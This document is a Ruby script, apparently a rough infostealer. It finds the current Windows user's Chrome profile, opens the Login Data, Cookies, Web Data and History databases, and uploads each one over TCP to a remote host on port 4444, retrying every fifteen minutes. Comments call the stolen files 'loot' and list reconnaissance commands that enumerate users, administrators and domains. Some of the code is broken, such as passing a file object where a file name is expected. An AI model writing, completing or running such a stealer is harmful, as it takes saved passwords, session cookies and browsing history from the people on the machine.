
require 'socket'

MAX_ATTEMPTS = 5
SIZE = 1024

def SendFile(rHost = 'localhost', port = 4444, fileNameTOSend)

  num_attempts = 0

  begin

    num_attempts += 1
    #Try to open up a connection to the server
    TCPSocket.open(rHost, port) do |socket|
      #Upload the file
      File.open(fileNameTOSend, 'rb') do |file|
        while chunk = file.read(SIZE)
          socket.write(chunk)
        end
      end
      end
      # If there is no luck with the connection, try again few times
  rescue Errno::ECONNREFUSED # use general error handling with ::Exception => e
    if num_attempts <= MAX_ATTEMPTS
      sleep(15*60) # minutes * 60 seconds
      retry
    else

  end

  end
end

#Let's save users and other info
#lt_user_list = `net user`
#lt_local_admins =  `net localgroup Administrators`
#lt_domains = `NET VIEW /DOMAIN`

#Current User and Domain

domanduser = `whoami`.split("\\")
#puts 'current user\'s domain: ' + domanduser[0]
#puts 'current user: ' + domanduser[1]

#Let's save some files, especially chrome DBs:

chrome_Path = "C:\\Users\\" + domanduser[1].chomp + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"

chrome_FileNames = { # just uncomment what's not needed
  :chrome_LoginFileName => 'Login Data',
  :chrome_WebFileName => 'Web Data',
  :chrome_CookieFileName => 'Cookies',
  :chrome_FakeFileName => 'FakeFile',
  :chrome_HistoryFileName => 'History'
}

chrome_FileNames.each_value do |chrome_File|
    # Opening file and
    # Confirming its existence : puts "Suspected file #{chrome_Path}#{chrome_File} exists"
  currentFile = File.open(chrome_Path+chrome_File.to_s) if File::exists?( chrome_Path+chrome_File.to_s )
  SendFile(currentFile)
end




#Let's send the loot up
#	read binary from memory





#File.open("c:/fajl.txt") if File::exists?( "c:/fajl.txt" )

=begin
## read file by bytes
myfile = "c:/fajl.txt"
if File::exists?( myfile )
puts myfile.to_s + "  exists"
  puts "Below is the content:"
#open the file
aFile = File.new("c:/fajl.txt", "r")
  # read by bytes (20 bytes here)
content = aFile.sysread(20)
puts content
else
  puts myfile.to_s + "  not exists"
end

=end
